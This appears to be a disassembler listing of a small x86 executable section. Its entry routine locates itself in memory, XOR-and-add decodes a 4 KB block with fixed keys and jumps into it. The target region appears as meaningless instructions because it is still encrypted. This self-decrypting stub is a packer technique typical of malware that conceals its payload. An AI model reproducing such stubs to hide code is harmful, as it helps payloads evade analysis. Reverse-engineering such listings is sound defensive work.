0x00525000:	stosb	%al, %es:(%edi)	; from: 0x005d8045(MAY)
0x00525001:	orl	$0xea128f6a, %eax
0x00525006:	popl	%esi
0x00525007:	decl	%edi
0x00525008:	outsb	%ds:(%esi), %dx
0x00525009:	loop	0x00524f8e	; targets: 0x00524f8e(MAY), 0x0052500b(MAY)
0x0052500b:	popl	(%edx)	; from: 0x00525009(MAY)
0x0052500d:	orb	-25(%edx), %ch
0x00525010:	popl	%ds
0x00525011:	fildll	-113(%ebx)
0x00525014:	adcb	0x1f6f9633(%edx), %cl
0x0052501a:	orl	-801351841(%eax), %ebx
0x00525020:	incl	%edx
0x00525021:	fsubrl	-116(%ebx)
0x00525024:	adcl	%ecx, (%edx)
0x00525026:	pushl	$0xffffff8f
0x00525028:	adcl	%ecx, (%edx)
0x0052502a:	pushl	$0xffffffcd
0x0052502c:	pushl	%edx
0x0052502d:	boundl	-113(%ebx), %ebp
0x00525030:	adcb	(%edx), %cl
0x00525032:	adcb	%dl, %dl
0x00525034:	adcb	0x6a(%edx), %bh
0x00525037:	popl	0x0b48050b
0x0052503d:	aam	$0x5
0x0052503f:	xorb	%bl, %ch
0x00525041:	xorl	%eax, (%esi,%eax,8)
0x00525044:	orb	%cl, %dh
0x00525046:	popl	%ecx
0x00525047:	movl	$0xb02fdda9, %esp
0x0052504c:	ret	$0xffff80b6	; targets: unresolved


start:
0x005d8000:	subl	$0x4, %esp
0x005d8003:	pushl	%eax
0x005d8004:	pushl	%ebx
0x005d8005:	call	0x005d800b	; targets: 0x005d800b(MAY)
0x005d800b:	popl	%eax	; from: 0x005d8005(MAY)
0x005d800c:	movl	%eax, %ebx
0x005d800e:	incl	%eax
0x005d800f:	subl	$0xb3000, %eax
0x005d8014:	subl	$0x1009bd33, %eax
0x005d8019:	addl	$0x1009bd28, %eax
0x005d801e:	cmpb	$0xffffffcc, (%ebx)
0x005d8021:	jne	0x005d803c	; targets: 0x005d8023(MAY)
0x005d8023:	movb	$0x0, (%ebx)	; from: 0x005d8021(MAY)
0x005d8026:	movl	$0x1000, %ebx
0x005d802b:	pushl	$0x61eb3c7a
0x005d8030:	pushl	$0x117ec994
0x005d8035:	pushl	%ebx
0x005d8036:	pushl	%eax
0x005d8037:	call	0x005d8046	; targets: 0x005d8046(MAY)
0x005d803c:	addl	$0x0, %eax	; from: 0x005d806f(MAY)
0x005d803f:	movl	%eax, 0x8(%esp)
0x005d8043:	popl	%ebx
0x005d8044:	popl	%eax
0x005d8045:	ret	; targets: 0x00525000(MAY)

0x005d8046:	pushl	%ebp	; from: 0x005d8037(MAY)
0x005d8047:	movl	%esp, %ebp
0x005d8049:	pushl	%eax
0x005d804a:	pushl	%ebx
0x005d804b:	pushl	%ecx
0x005d804c:	pushl	%esi
0x005d804d:	movl	0x8(%ebp), %esi
0x005d8050:	movl	0xc(%ebp), %ecx
0x005d8053:	shrl	$0x2, %ecx
0x005d8056:	movl	0x10(%ebp), %eax
0x005d8059:	movl	0x14(%ebp), %ebx
0x005d805c:	testl	%ecx, %ecx	; from: 0x005d8068(MAY)
0x005d805e:	je	0x005d806a	; targets: 0x005d8060(MAY), 0x005d806a(MAY)
0x005d8060:	xorl	%eax, (%esi)	; from: 0x005d805e(MAY)
0x005d8062:	addl	%ebx, (%esi)
0x005d8064:	addl	$0x4, %esi
0x005d8067:	decl	%ecx
0x005d8068:	jmp	0x005d805c	; targets: 0x005d805c(MAY)
0x005d806a:	popl	%esi	; from: 0x005d805e(MAY)
0x005d806b:	popl	%ecx
0x005d806c:	popl	%ebx
0x005d806d:	popl	%eax
0x005d806e:	leave	
0x005d806f:	ret	$0x10	; targets: 0x005d803c(MAY)

